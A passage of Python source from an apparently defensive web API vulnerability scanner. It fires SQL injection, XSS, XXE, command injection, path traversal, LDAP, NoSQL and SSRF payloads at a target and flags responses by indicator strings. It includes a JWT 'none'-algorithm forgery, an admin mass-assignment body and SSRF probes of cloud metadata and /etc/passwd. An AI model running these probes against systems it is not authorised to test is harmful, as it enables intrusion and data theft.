                        if found_indicators:
                            # Get security layer information
                            security_info = get_security_layer_info(sqli_resp, payload)
                            sqli_vulnerabilities.append(f"URL_PARAM: {payload} | {security_info}")
                
                # Test POST body parameters (for POST/PUT/PATCH requests)
                if method.upper() in ['POST', 'PUT', 'PATCH'] and data:
                    try:
                        # Parse existing JSON data
                        if isinstance(data, str):
                            json_data = json.loads(data)
                        else:
                            json_data = data
                        
                        # Test each field in the JSON body
                        for field_name in json_data.keys():
                            original_value = json_data[field_name]
                            for payload in SQLI_PAYLOADS:
                                # Create new data with SQL injection payload
                                test_data = json_data.copy()
                                test_data[field_name] = payload
                                
                                sqli_resp = req_func(url, headers=headers, data=json.dumps(test_data), timeout=5)
                                
                                # Use centralized false positive detection with payload and attack type
                                if not is_false_positive(sqli_resp, resp, payload, "sql_injection"):
                                    # Check for SQL indicators (only if not a false positive)
                                    sql_indicators = ['sql', 'mysql', 'oracle', 'postgresql', 'syntax error', 'warning']
                                    found_sql_indicators = []
                                    for indicator in sql_indicators:
                                        if indicator in sqli_resp.text.lower():
                                            found_sql_indicators.append(indicator)
                                    
                                    if found_sql_indicators:
                                        # Get security layer information
                                        security_info = get_security_layer_info(sqli_resp, payload)
                                        sqli_vulnerabilities.append(f"BODY_{field_name}: {payload} | {security_info}")
                    except (json.JSONDecodeError, TypeError):
                        # If not JSON, test as form data
                        for payload in SQLI_PAYLOADS:
                            if isinstance(data, str):
                                # Try to append to form data
                                test_data = data + f"&id={quote(payload)}"
                            else:
                                test_data = data
                            sqli_resp = req_func(url, headers=headers, data=test_data, timeout=5)
                            
                            # Use centralized false positive detection with payload and attack type
                            if not is_false_positive(sqli_resp, resp, payload, "sql_injection"):
                                # Check for SQL indicators (only if not a false positive)
                                sql_indicators = ['sql', 'mysql', 'oracle', 'postgresql', 'syntax error', 'warning']
                                found_sql_indicators = []
                                for indicator in sql_indicators:
                                    if indicator in sqli_resp.text.lower():
                                        found_sql_indicators.append(indicator)
                                
                                if found_sql_indicators:
                                    # Get security layer information
                                    security_info = get_security_layer_info(sqli_resp, payload)
                                    sqli_vulnerabilities.append(f"FORM_DATA: {payload} | {security_info}")
                
                if sqli_vulnerabilities:
                    findings["sql_injection"].append({"url": url, "payloads": sqli_vulnerabilities})
                progress.finish_check("Testing SQL Injection Vulnerabilities")

            # 4. XSS tests
            if 'xss' in checks_to_run:
                progress.start_check("Testing XSS (Cross-Site Scripting)")
                xss_vulnerabilities = []
                
                # Test URL parameters (for GET requests or if URL has params)
                if method.upper() == 'GET' or '?' in url:
                    for payload in XSS_PAYLOADS:
                        # Test existing URL parameters
                        if '?' in url:
                            # Add to existing parameters
                            xss_url = url + f"&q={quote(payload)}"
                        else:
                            # Add new parameter
                            xss_url = url + f"?q={quote(payload)}"
                        xss_resp = req_func(xss_url, headers=headers, data=data, timeout=5)
                        # Check if XSS indicators are found
                        found_indicators = []
                        
                        # Enhanced XSS detection
                        xss_indicators = [
                            '<script', 'javascript:', 'onerror', 'onload', 'onclick',
                            'onmouseover', 'onfocus', 'onblur', 'onchange',
                            'alert(', 'confirm(', 'prompt(', 'eval(', 'document.cookie',
                            'window.location', 'document.location', 'innerhtml',
                            'outerhtml', 'document.write', 'document.writeln',
                            'settimeout', 'setinterval', 'eval(', 'function(',
                            'vbscript:', 'expression(', 'url(', 'behavior:',
                            'background:', 'background-image:', 'background-color:',
                            'border:', 'color:', 'font-family:', 'font-size:',
                            'margin:', 'padding:', 'text-align:', 'text-decoration:'
                        ]
                        
                        # Use centralized false positive detection with payload and attack type
                        if is_false_positive(xss_resp, resp, payload, "xss"):
                            continue  # Skip false positives
                        
                        # Check for XSS indicators (only if not a false positive)
                        for indicator in xss_indicators:
                            if indicator in xss_resp.text.lower():
                                found_indicators.append(indicator)
                        
                        # Check for reflected XSS (payload appears in response)
                        if payload in xss_resp.text:
                            found_indicators.append('reflected_xss')
                        
                        # Check for stored XSS (payload persists) - only if significant difference
                        if len(xss_resp.text) > len(resp.text) * 1.3:  # 30% more content (increased threshold)
                            found_indicators.append('potential_stored_xss')
                        
                        # Check for DOM-based XSS indicators
                        dom_indicators = [
                            'document.', 'window.', 'location.', 'history.',
                            'navigator.', 'screen.', 'localstorage', 'sessionstorage'
                        ]
                        for indicator in dom_indicators:
                            if indicator in xss_resp.text.lower():
                                found_indicators.append('dom_xss_indicator')
                        
                        if found_indicators or payload in xss_resp.text:
                            # Get security layer information
                            security_info = get_security_layer_info(xss_resp, payload)
                            xss_vulnerabilities.append(f"URL_PARAM: {payload} | {security_info}")
                
                # Test POST body parameters (for POST/PUT/PATCH requests)
                if method.upper() in ['POST', 'PUT', 'PATCH'] and data:
                    try:
                        # Parse existing JSON data
                        if isinstance(data, str):
                            json_data = json.loads(data)
                        else:
                            json_data = data
                        
                        # Test each field in the JSON body
                        for field_name in json_data.keys():
                            original_value = json_data[field_name]
                            for payload in XSS_PAYLOADS:
                                # Create new data with XSS payload
                                test_data = json_data.copy()
                                test_data[field_name] = payload
                                
                                xss_resp = req_func(url, headers=headers, data=json.dumps(test_data), timeout=5)
                                
                                # Use centralized false positive detection with payload and attack type
                                if not is_false_positive(xss_resp, resp, payload, "xss"):
                                    if payload in xss_resp.text or any(xss_indicator in xss_resp.text.lower() for xss_indicator in ['<script', 'javascript:', 'onerror']):
                                        # Get security layer information
                                        security_info = get_security_layer_info(xss_resp, payload)
                                        xss_vulnerabilities.append(f"BODY_{field_name}: {payload} | {security_info}")
                    except (json.JSONDecodeError, TypeError):
                        # If not JSON, test as form data
                        for payload in XSS_PAYLOADS:
                            if isinstance(data, str):
                                # Try to append to form data
                                test_data = data + f"&q={quote(payload)}"
                            else:
                                test_data = data
                            xss_resp = req_func(url, headers=headers, data=test_data, timeout=5)
                            
                            # Use centralized false positive detection with payload and attack type
                            if not is_false_positive(xss_resp, resp, payload, "xss"):
                                if payload in xss_resp.text or any(xss_indicator in xss_resp.text.lower() for xss_indicator in ['<script', 'javascript:', 'onerror']):
                                    # Get security layer information
                                    security_info = get_security_layer_info(xss_resp, payload)
                                    xss_vulnerabilities.append(f"FORM_DATA: {payload} | {security_info}")
                
                if xss_vulnerabilities:
                    findings["xss"].append({"url": url, "payloads": xss_vulnerabilities})
                progress.finish_check("Testing XSS (Cross-Site Scripting)")

            # 5. XXE tests
            if 'xxe' in checks_to_run:
                progress.start_check("Testing XXE (XML External Entity)")
                if 'xml' in headers.get('Content-Type', '').lower():
                    xxe_vulnerabilities = []
                    for payload in XXE_PAYLOADS:
                        xxe_headers = headers.copy()
                        xxe_headers['Content-Type'] = 'application/xml'
                        xxe_resp = requests.post(url, headers=xxe_headers, data=payload, timeout=5)
                        if 'root:' in xxe_resp.text or 'daemon:' in xxe_resp.text:
                            xxe_vulnerabilities.append(payload)
                    if xxe_vulnerabilities:
                        findings["xxe"].append({"url": url, "payloads": xxe_vulnerabilities})
                progress.finish_check("Testing XXE (XML External Entity)")

            # 6. NoSQL Injection tests
            if 'nosql_injection' in checks_to_run:
                progress.start_check("Testing NoSQL Injection")
                nosql_vulnerabilities = []
                for payload in NOSQL_PAYLOADS:
                    if method.upper() == 'POST':
                        nosql_headers = headers.copy()
                        nosql_headers['Content-Type'] = 'application/json'
                        nosql_data = json.dumps({"username": payload, "password": payload})
                        nosql_resp = requests.post(url, headers=nosql_headers, data=nosql_data, timeout=5)
                        if nosql_resp.status_code == 200 and len(nosql_resp.text) > len(resp.text):
                            nosql_vulnerabilities.append(payload)
                if nosql_vulnerabilities:
                    findings["nosql_injection"].append({"url": url, "payloads": nosql_vulnerabilities})
                progress.finish_check("Testing NoSQL Injection")

            # 7. LDAP Injection tests
            if 'ldap_injection' in checks_to_run:
                progress.start_check("Testing LDAP Injection")
                ldap_vulnerabilities = []
                
                # Test URL parameters (for GET requests or if URL has params)
                if method.upper() == 'GET' or '?' in url:
                    for payload in LDAP_PAYLOADS:
                        ldap_url = url + f"?username={quote(payload)}"
                        ldap_resp = req_func(ldap_url, headers=headers, data=data, timeout=5)
                        if any(ldap_indicator in ldap_resp.text.lower() for ldap_indicator in ['ldap', 'distinguished name', 'cn=', 'ou=']):
                            ldap_vulnerabilities.append(f"URL_PARAM: {payload}")
                
                # Test POST body parameters (for POST/PUT/PATCH requests)
                if method.upper() in ['POST', 'PUT', 'PATCH'] and data:
                    try:
                        # Parse existing JSON data
                        if isinstance(data, str):
                            json_data = json.loads(data)
                        else:
                            json_data = data
                        
                        # Test each field in the JSON body
                        for field_name in json_data.keys():
                            original_value = json_data[field_name]
                            for payload in LDAP_PAYLOADS:
                                # Create new data with LDAP injection payload
                                test_data = json_data.copy()
                                test_data[field_name] = payload
                                
                                ldap_resp = req_func(url, headers=headers, data=json.dumps(test_data), timeout=5)
                                if any(ldap_indicator in ldap_resp.text.lower() for ldap_indicator in ['ldap', 'distinguished name', 'cn=', 'ou=']):
                                    ldap_vulnerabilities.append(f"BODY_{field_name}: {payload}")
                    except (json.JSONDecodeError, TypeError):
                        # If not JSON, test as form data
                        for payload in LDAP_PAYLOADS:
                            if isinstance(data, str):
                                # Try to append to form data
                                test_data = data + f"&username={quote(payload)}"
                            else:
                                test_data = data
                            ldap_resp = req_func(url, headers=headers, data=test_data, timeout=5)
                            if any(ldap_indicator in ldap_resp.text.lower() for ldap_indicator in ['ldap', 'distinguished name', 'cn=', 'ou=']):
                                ldap_vulnerabilities.append(f"FORM_DATA: {payload}")
                
                if ldap_vulnerabilities:
                    findings["ldap_injection"].append({"url": url, "payloads": ldap_vulnerabilities})
                progress.finish_check("Testing LDAP Injection")

            # 8. Command Injection tests
            if 'command_injection' in checks_to_run:
                progress.start_check("Testing Command Injection")
                cmd_vulnerabilities = []
                
                # Test URL parameters (for GET requests or if URL has params)
                if method.upper() == 'GET' or '?' in url:
                    for payload in COMMAND_INJECTION_PAYLOADS:
                        cmd_url = url + f"?cmd={quote(payload)}"
                        start_time = time.time()
                        cmd_resp = req_func(cmd_url, headers=headers, data=data, timeout=10)
                        response_time = time.time() - start_time
                        # Check if command injection indicators are found
                        found_indicators = []
                        
                        # Enhanced command injection detection
                        cmd_indicators = [
                            'root:', 'bin:', 'usr:', 'etc:', 'uid=', 'gid=', 'home:',
                            'total ', 'drwx', '-rwx', 'lrwx', 'crwx', 'brwx',
                            'directory', 'file', 'permission denied', 'command not found',
                            'no such file', 'cannot execute', 'access denied',
                            'bash:', 'sh:', 'shell:', 'terminal:', 'console:',
                            'system32', 'windows', 'program files', 'temp',
                            'process', 'tasklist', 'ps aux', 'top', 'htop',
                            'netstat', 'ifconfig', 'ipconfig', 'route',
                            'whoami', 'groups', 'pwd', 'dir',
                            'cat ', 'type ', 'more ', 'less ', 'head ', 'tail ',
                            'grep ', 'find ', 'locate ', 'which ', 'where ',
                            'ping ', 'nslookup ', 'dig ', 'traceroute ',
                            'telnet ', 'nc ', 'netcat ', 'ssh ', 'ftp ',
                            'wget ', 'curl ', 'lynx ', 'links ', 'elinks ',
                            'chmod ', 'chown ', 'chgrp ', 'umask ',
                            'su ', 'sudo ', 'passwd ', 'useradd ', 'userdel ',
                            'groupadd ', 'groupdel ', 'usermod ', 'groupmod ',
                            'root'  # Add root as a direct indicator
                        ]
                        
                        # Use centralized false positive detection with payload and attack type
                        if is_false_positive(cmd_resp, resp, payload, "command_injection"):
                            continue  # Skip false positives
                        
                        # Check for command injection indicators (only if not a false positive)
                        for indicator in cmd_indicators:
                            if indicator in cmd_resp.text.lower():
                                # Additional context check to avoid false positives
                                if indicator == 'id':
                                    # Check if it's part of a JSON field (like userId, deviceId)
                                    if any(field in cmd_resp.text.lower() for field in ['userid', 'deviceid', 'accountid', 'sessionid', 'requestid']):
                                        continue  # Skip if it's just a JSON field
                                found_indicators.append(indicator)
                        
                        # Check for timing-based command injection
                        if 'ping' in payload.lower() or 'sleep' in payload.lower():
                            if response_time > 3:  # Significant delay
                                found_indicators.append('timing_based_injection')
                        
                        # Check for output-based command injection (only if significant difference AND content is different)
                        if any(cmd in payload.lower() for cmd in ['dir', 'cat', 'type', 'whoami']):
                            # Check if response is significantly larger AND contains different content
                            if len(cmd_resp.text) > len(resp.text) * 1.5:  # 50% more output
                                # Check if response contains command output indicators
                                cmd_output_indicators = ['root:', 'bin:', 'usr:', 'etc:', 'uid=', 'gid=', 'home:', 'total ', 'drwx', '-rwx']
                                if any(indicator in cmd_resp.text.lower() for indicator in cmd_output_indicators):
                                    found_indicators.append('output_based_injection')
                        
                        # Check for error-based command injection
                        error_indicators = [
                            'command not found', 'no such file', 'permission denied',
                            'cannot execute', 'access denied', 'syntax error'
                        ]
                        for indicator in error_indicators:
                            if indicator in cmd_resp.text.lower():
                                found_indicators.append('error_based_injection')
                        
                        # Check for blind command injection (no output but execution)
                        if any(cmd in payload.lower() for cmd in ['ping', 'sleep', 'wait']):
                            if response_time > 2:  # Delayed response
                                found_indicators.append('blind_injection')
                        
                        # Additional checks are now handled by is_false_positive function
                        
                        if found_indicators:
                            # Get security layer information
                            security_info = get_security_layer_info(cmd_resp, payload)
                            cmd_vulnerabilities.append(f"URL_PARAM: {payload} | {security_info}")
                
                # Test POST body parameters (for POST/PUT/PATCH requests)
                if method.upper() in ['POST', 'PUT', 'PATCH'] and data:
                    try:
                        # Parse existing JSON data
                        if isinstance(data, str):
                            json_data = json.loads(data)
                        else:
                            json_data = data
                        
                        # Test each field in the JSON body
                        for field_name in json_data.keys():
                            original_value = json_data[field_name]
                            for payload in COMMAND_INJECTION_PAYLOADS:
                                # Create new data with command injection payload
                                test_data = json_data.copy()
                                test_data[field_name] = payload
                                
                                start_time = time.time()
                                cmd_resp = req_func(url, headers=headers, data=json.dumps(test_data), timeout=10)
                                response_time = time.time() - start_time
                                # Check if command injection indicators are found
                                found_indicators = []
                                
                                # Enhanced command injection detection
                                cmd_indicators = [
                                    'root:', 'bin:', 'usr:', 'etc:', 'uid=', 'gid=', 'home:',
                                    'total ', 'drwx', '-rwx', 'lrwx', 'crwx', 'brwx',
                                    'directory', 'file', 'permission denied', 'command not found',
                                    'no such file', 'cannot execute', 'access denied',
                                    'bash:', 'sh:', 'shell:', 'terminal:', 'console:',
                                    'system32', 'windows', 'program files', 'temp',
                                    'process', 'tasklist', 'ps aux', 'top', 'htop',
                                    'netstat', 'ifconfig', 'ipconfig', 'route',
                                    'whoami', 'groups', 'pwd', 'dir',
                                    'cat ', 'type ', 'more ', 'less ', 'head ', 'tail ',
                                    'grep ', 'find ', 'locate ', 'which ', 'where ',
                                    'ping ', 'nslookup ', 'dig ', 'traceroute ',
                                    'telnet ', 'nc ', 'netcat ', 'ssh ', 'ftp ',
                                    'wget ', 'curl ', 'lynx ', 'links ', 'elinks ',
                                    'chmod ', 'chown ', 'chgrp ', 'umask ',
                                    'su ', 'sudo ', 'passwd ', 'useradd ', 'userdel ',
                                    'groupadd ', 'groupdel ', 'usermod ', 'groupmod '
                                ]
                                
                                # Use centralized false positive detection with payload and attack type
                                if not is_false_positive(cmd_resp, resp, payload, "command_injection"):
                                    # Check for command injection indicators (only if not a false positive)
                                    for indicator in cmd_indicators:
                                        if indicator in cmd_resp.text.lower():
                                            # Additional context check to avoid false positives
                                            if indicator == 'id':
                                                # Check if it's part of a JSON field (like userId, deviceId)
                                                if any(field in cmd_resp.text.lower() for field in ['userid', 'deviceid', 'accountid', 'sessionid', 'requestid']):
                                                    continue  # Skip if it's just a JSON field
                                            found_indicators.append(indicator)
                                
                                # Check for timing-based command injection
                                if 'ping' in payload.lower() or 'sleep' in payload.lower():
                                    if response_time > 3:  # Significant delay
                                        found_indicators.append('timing_based_injection')
                                
                                # Check for output-based command injection (only if significant difference AND content is different)
                                if any(cmd in payload.lower() for cmd in ['dir', 'cat', 'type', 'whoami']):
                                    # Check if response is significantly larger AND contains different content
                                    if len(cmd_resp.text) > len(resp.text) * 1.5:  # 50% more output
                                        # Check if response contains command output indicators
                                        cmd_output_indicators = ['root:', 'bin:', 'usr:', 'etc:', 'uid=', 'gid=', 'home:', 'total ', 'drwx', '-rwx']
                                        if any(indicator in cmd_resp.text.lower() for indicator in cmd_output_indicators):
                                            found_indicators.append('output_based_injection')
                                
                                # Check for error-based command injection
                                error_indicators = [
                                    'command not found', 'no such file', 'permission denied',
                                    'cannot execute', 'access denied', 'syntax error'
                                ]
                                for indicator in error_indicators:
                                    if indicator in cmd_resp.text.lower():
                                        found_indicators.append('error_based_injection')
                                
                                # Check for blind command injection (no output but execution)
                                if any(cmd in payload.lower() for cmd in ['ping', 'sleep', 'wait']):
                                    if response_time > 2:  # Delayed response
                                        found_indicators.append('blind_injection')
                                
                                # Additional checks are now handled by is_false_positive function
                                
                                if found_indicators:
                                    # Get security layer information
                                    security_info = get_security_layer_info(cmd_resp, payload)
                                    cmd_vulnerabilities.append(f"BODY_{field_name}: {payload} | {security_info}")
                    except (json.JSONDecodeError, TypeError):
                        # If not JSON, test as form data
                        for payload in COMMAND_INJECTION_PAYLOADS:
                            if isinstance(data, str):
                                # Try to append to form data
                                test_data = data + f"&cmd={quote(payload)}"
                            else:
                                test_data = data
                            start_time = time.time()
                            cmd_resp = req_func(url, headers=headers, data=test_data, timeout=10)
                            response_time = time.time() - start_time
                            # Check if command injection indicators are found
                            found_indicators = []
                            
                            # Enhanced command injection detection
                            cmd_indicators = [
                                'root:', 'bin:', 'usr:', 'etc:', 'uid=', 'gid=', 'home:',
                                'total ', 'drwx', '-rwx', 'lrwx', 'crwx', 'brwx',
                                'directory', 'file', 'permission denied', 'command not found',
                                'no such file', 'cannot execute', 'access denied',
                                'bash:', 'sh:', 'shell:', 'terminal:', 'console:',
                                'system32', 'windows', 'program files', 'temp',
                                'process', 'tasklist', 'ps aux', 'top', 'htop',
                                'netstat', 'ifconfig', 'ipconfig', 'route',
                                'whoami', 'groups', 'pwd', 'dir',
                                'cat ', 'type ', 'more ', 'less ', 'head ', 'tail ',
                                'grep ', 'find ', 'locate ', 'which ', 'where ',
                                'ping ', 'nslookup ', 'dig ', 'traceroute ',
                                'telnet ', 'nc ', 'netcat ', 'ssh ', 'ftp ',
                                'wget ', 'curl ', 'lynx ', 'links ', 'elinks ',
                                'chmod ', 'chown ', 'chgrp ', 'umask ',
                                'su ', 'sudo ', 'passwd ', 'useradd ', 'userdel ',
                                'groupadd ', 'groupdel ', 'usermod ', 'groupmod '
                            ]
                            
                            # Use centralized false positive detection with payload and attack type
                            if not is_false_positive(cmd_resp, resp, payload, "command_injection"):
                                # Check for command injection indicators (only if not a false positive)
                                for indicator in cmd_indicators:
                                    if indicator in cmd_resp.text.lower():
                                        found_indicators.append(indicator)
                            
                            # Check for timing-based command injection
                            if 'ping' in payload.lower() or 'sleep' in payload.lower():
                                if response_time > 3:  # Significant delay
                                    found_indicators.append('timing_based_injection')
                            
                            # Check for output-based command injection (only if significant difference AND content is different)
                            if any(cmd in payload.lower() for cmd in ['dir', 'cat', 'type', 'whoami']):
                                # Check if response is significantly larger AND contains different content
                                if len(cmd_resp.text) > len(resp.text) * 1.5:  # 50% more output
                                    # Check if response contains command output indicators
                                    cmd_output_indicators = ['root:', 'bin:', 'usr:', 'etc:', 'uid=', 'gid=', 'home:', 'total ', 'drwx', '-rwx']
                                    if any(indicator in cmd_resp.text.lower() for indicator in cmd_output_indicators):
                                        found_indicators.append('output_based_injection')
                            
                            # Check for error-based command injection
                            error_indicators = [
                                'command not found', 'no such file', 'permission denied',
                                'cannot execute', 'access denied', 'syntax error'
                            ]
                            for indicator in error_indicators:
                                if indicator in cmd_resp.text.lower():
                                    found_indicators.append('error_based_injection')
                            
                            # Check for blind command injection (no output but execution)
                            if any(cmd in payload.lower() for cmd in ['ping', 'sleep', 'wait']):
                                if response_time > 2:  # Delayed response
                                    found_indicators.append('blind_injection')
                            
                            # Additional checks are now handled by is_false_positive function
                            
                            if found_indicators:
                                # Get security layer information
                                security_info = get_security_layer_info(cmd_resp, payload)
                                cmd_vulnerabilities.append(f"FORM_DATA: {payload} | {security_info}")
                
                if cmd_vulnerabilities:
                    findings["command_injection"].append({"url": url, "payloads": cmd_vulnerabilities})
                progress.finish_check("Testing Command Injection")

            # 9. Path Traversal tests
            if 'path_traversal' in checks_to_run:
                progress.start_check("Testing Path Traversal")
                path_vulnerabilities = []
                
                # Test URL parameters (for GET requests or if URL has params)
                if method.upper() == 'GET' or '?' in url:
                    for payload in PATH_TRAVERSAL_PAYLOADS:
                        path_url = url + f"?file={quote(payload)}"
                        path_resp = req_func(path_url, headers=headers, data=data, timeout=5)
                        if any(path_indicator in path_resp.text.lower() for path_indicator in ['root:', 'daemon:', 'bin:', '[boot loader]']):
                            path_vulnerabilities.append(f"URL_PARAM: {payload}")
                
                # Test POST body parameters (for POST/PUT/PATCH requests)
                if method.upper() in ['POST', 'PUT', 'PATCH'] and data:
                    try:
                        # Parse existing JSON data
                        if isinstance(data, str):
                            json_data = json.loads(data)
                        else:
                            json_data = data
                        
                        # Test each field in the JSON body
                        for field_name in json_data.keys():
                            original_value = json_data[field_name]
                            for payload in PATH_TRAVERSAL_PAYLOADS:
                                # Create new data with path traversal payload
                                test_data = json_data.copy()
                                test_data[field_name] = payload
                                
                                path_resp = req_func(url, headers=headers, data=json.dumps(test_data), timeout=5)
                                if any(path_indicator in path_resp.text.lower() for path_indicator in ['root:', 'daemon:', 'bin:', '[boot loader]']):
                                    path_vulnerabilities.append(f"BODY_{field_name}: {payload}")
                    except (json.JSONDecodeError, TypeError):
                        # If not JSON, test as form data
                        for payload in PATH_TRAVERSAL_PAYLOADS:
                            if isinstance(data, str):
                                # Try to append to form data
                                test_data = data + f"&file={quote(payload)}"
                            else:
                                test_data = data
                            path_resp = req_func(url, headers=headers, data=test_data, timeout=5)
                            if any(path_indicator in path_resp.text.lower() for path_indicator in ['root:', 'daemon:', 'bin:', '[boot loader]']):
                                path_vulnerabilities.append(f"FORM_DATA: {payload}")
                
                if path_vulnerabilities:
                    findings["path_traversal"].append({"url": url, "payloads": path_vulnerabilities})
                progress.finish_check("Testing Path Traversal")

            # 10. JWT Attacks
            if 'jwt_attacks' in checks_to_run:
                progress.start_check("Testing JWT Attacks")
                jwt_findings = {}
                for header_name, header_value in headers.items():
                    if 'eyJ' in str(header_value):
                        try:
                            jwt_parts = str(header_value).split('.')
                            if len(jwt_parts) >= 2:
                                header_decoded = json.loads(base64.b64decode(jwt_parts[0] + '=='))
                                header_decoded['alg'] = 'none'
                                none_header = base64.b64encode(json.dumps(header_decoded).encode()).decode().rstrip('=')
                                none_jwt = f"{none_header}.{jwt_parts[1]}."
                                none_headers = headers.copy()
                                none_headers[header_name] = none_jwt
                                none_resp = req_func(url, headers=none_headers, data=data, timeout=5)
                                jwt_findings['none_algorithm'] = none_resp.status_code == 200
                        except:
                            pass
                if jwt_findings:
                    findings["jwt_attacks"][url] = jwt_findings
                progress.finish_check("Testing JWT Attacks")

            # 11. Mass Assignment
            if 'mass_assignment' in checks_to_run:
                progress.start_check("Testing Mass Assignment")
                if method.upper() == 'POST':
                    mass_assign_data = json.dumps({
                        "username": "test",
                        "password": "test",
                        "admin": True,
                        "role": "admin",
                        "is_admin": True,
                        "permissions": ["admin", "read", "write"]
                    })
                    mass_headers = headers.copy()
                    mass_headers['Content-Type'] = 'application/json'
                    mass_resp = requests.post(url, headers=mass_headers, data=mass_assign_data, timeout=5)
                    findings["mass_assignment"][url] = {
                        "tested": True,
                        "status_code": mass_resp.status_code,
                        "potential_issue": mass_resp.status_code == 200
                    }
                progress.finish_check("Testing Mass Assignment")

            # 12. Business Logic Tests
            if 'business_logic' in checks_to_run:
                progress.start_check("Testing Business Logic Flaws")
                business_logic = {}
                
                # Test URL parameters (for GET requests or if URL has params)
                if method.upper() == 'GET' or '?' in url:
                    negative_url = url + "?amount=-1000&quantity=-5"
                    negative_resp = req_func(negative_url, headers=headers, data=data, timeout=5)
                    business_logic['negative_values_url'] = negative_resp.status_code == 200
                    
                    large_url = url + "?amount=999999999&quantity=999999"
                    large_resp = req_func(large_url, headers=headers, data=data, timeout=5)
                    business_logic['large_values_url'] = large_resp.status_code == 200
                
                # Test POST body parameters (for POST/PUT/PATCH requests)
                if method.upper() in ['POST', 'PUT', 'PATCH'] and data:
                    try:
                        # Parse existing JSON data
                        if isinstance(data, str):
                            json_data = json.loads(data)
                        else:
                            json_data = data
                        
                        # Test negative values in body
                        test_data = json_data.copy()
                        test_data['amount'] = -1000
                        test_data['quantity'] = -5
                        negative_resp = req_func(url, headers=headers, data=json.dumps(test_data), timeout=5)
                        business_logic['negative_values_body'] = negative_resp.status_code == 200
                        
                        # Test large values in body
                        test_data = json_data.copy()
                        test_data['amount'] = 999999999
                        test_data['quantity'] = 999999
                        large_resp = req_func(url, headers=headers, data=json.dumps(test_data), timeout=5)
                        business_logic['large_values_body'] = large_resp.status_code == 200
                        
                    except (json.JSONDecodeError, TypeError):
                        # If not JSON, test as form data
                        negative_data = data + "&amount=-1000&quantity=-5" if isinstance(data, str) else data
                        negative_resp = req_func(url, headers=headers, data=negative_data, timeout=5)
                        business_logic['negative_values_form'] = negative_resp.status_code == 200
                        
                        large_data = data + "&amount=999999999&quantity=999999" if isinstance(data, str) else data
                        large_resp = req_func(url, headers=headers, data=large_data, timeout=5)
                        business_logic['large_values_form'] = large_resp.status_code == 200
                
                findings["business_logic"][url] = business_logic
                progress.finish_check("Testing Business Logic Flaws")

            # 13. SSRF tests
            if 'ssrf' in checks_to_run:
                progress.start_check("Testing SSRF (Server-Side Request Forgery)")
                ssrf_results = {}
                ssrf_payloads = [
                    CANARY_URL,
                    "http://localhost:80",
                    "http://127.0.0.1:22",
                    "http://169.254.169.254/latest/meta-data/",
                    "file:///etc/passwd",
                    "gopher://127.0.0.1:25/"
                ]
                
                # Test URL parameters (for GET requests or if URL has params)
                if method.upper() == 'GET' or '?' in url:
                    for payload in ssrf_payloads:
                        ssrf_url = url + f"?url={quote(payload)}"
                        ssrf_resp = req_func(ssrf_url, headers=headers, data=data, timeout=5)
                        ssrf_results[f"URL_PARAM: {payload}"] = {
                            "status_code": ssrf_resp.status_code,
                            "response_length": len(ssrf_resp.text)
                        }
                
                # Test POST body parameters (for POST/PUT/PATCH requests)
                if method.upper() in ['POST', 'PUT', 'PATCH'] and data:
                    try:
                        # Parse existing JSON data
                        if isinstance(data, str):
                            json_data = json.loads(data)
                        else:
                            json_data = data
                        
                        # Test each field in the JSON body
                        for field_name in json_data.keys():
                            original_value = json_data[field_name]
                            for payload in ssrf_payloads:
                                # Create new data with SSRF payload
                                test_data = json_data.copy()
                                test_data[field_name] = payload
                                
                                ssrf_resp = req_func(url, headers=headers, data=json.dumps(test_data), timeout=5)
                                ssrf_results[f"BODY_{field_name}: {payload}"] = {
                                    "status_code": ssrf_resp.status_code,
                                    "response_length": len(ssrf_resp.text)
                                }
                    except (json.JSONDecodeError, TypeError):
                        # If not JSON, test as form data
                        for payload in ssrf_payloads:
                            if isinstance(data, str):
                                # Try to append to form data
                                test_data = data + f"&url={quote(payload)}"
                            else:
                                test_data = data
                            ssrf_resp = req_func(url, headers=headers, data=test_data, timeout=5)
                            ssrf_results[f"FORM_DATA: {payload}"] = {
                                "status_code": ssrf_resp.status_code,
                                "response_length": len(ssrf_resp.text)
                            }
                
                findings["ssrf"][url] = ssrf_results
                progress.finish_check("Testing SSRF (Server-Side Request Forgery)")

            # Medium Priority Checks
            
            # 14. Security Headers
            if 'security_headers' in checks_to_run:
                progress.start_check("Checking Security Headers")
                findings["security_headers"][url] = {h: resp.headers.get(h) for h in SECURITY_HEADERS}
                progress.finish_check("Checking Security Headers")

            # 15. CORS check
            if 'cors' in checks_to_run:
                progress.start_check("Testing CORS Configuration")
                cors_findings = {}
                cors_findings['origin'] = resp.headers.get("Access-Control-Allow-Origin")
                cors_findings['methods'] = resp.headers.get("Access-Control-Allow-Methods")
                cors_findings['headers'] = resp.headers.get("Access-Control-Allow-Headers")
                cors_findings['credentials'] = resp.headers.get("Access-Control-Allow-Credentials")
                findings["cors"][url] = cors_findings
                progress.finish_check("Testing CORS Configuration")

            # 16. Rate limiting
            if 'rate_limiting' in checks_to_run:
                progress.start_check("Testing Rate Limiting")
                rate_limit_triggered = False
                rate_limit_headers = {}
                try:
                    for i in range(10):
                        try:
                            r = req_func(url, headers=headers, data=data, timeout=2)
                            if r.status_code == 429:
                                rate_limit_triggered = True
                                rate_limit_headers = dict(r.headers)
                                break
                        except Exception as e:
                            print(f"⚠️  Warning: Rate limiting test request {i+1} failed: {e}")
                            continue
                except Exception as e:
                    print(f"⚠️  Warning: Rate limiting test failed: {e}")
                
                findings["rate_limiting"][url] = {
                    "triggered": rate_limit_triggered,
                    "headers": rate_limit_headers
                }
                progress.finish_check("Testing Rate Limiting")

            # 17. Error handling
            if 'error_handling' in checks_to_run:
                progress.start_check("Testing Error Handling")
                try:
                    error_patterns = [
                        r"Exception", r"Traceback", r"at line", r"SQLSTATE", r"error in",
                        r"not allowed", r"denied", r"forbidden", r"unauthorized",
                        r"stack trace", r"debug", r"warning", r"fatal"
                    ]
                    error_findings = []
                    for pat in error_patterns:
                        if re.search(pat, resp.text, re.IGNORECASE):
                            error_findings.append(pat)
                    findings["error_handling"][url] = error_findings
                except Exception as e:
                    print(f"⚠️  Warning: Error handling test failed: {e}")
                    findings["error_handling"][url] = []
                progress.finish_check("Testing Error Handling")

            # 18. Input validation
            if 'input_validation' in checks_to_run:
                progress.start_check("Testing Input Validation")
                try:
                    validation_results = {}
                    test_payloads = SQLI_PAYLOADS[:3] + XSS_PAYLOADS[:3]
                    
                    # Test URL parameters (for GET requests or if URL has params)
                    if method.upper() == 'GET' or '?' in url:
                        for payload in test_payloads:
                            try:
                                fuzz_url = url + f"?input={quote(payload)}"
                                fuzz_resp = req_func(fuzz_url, headers=headers, data=data, timeout=5)
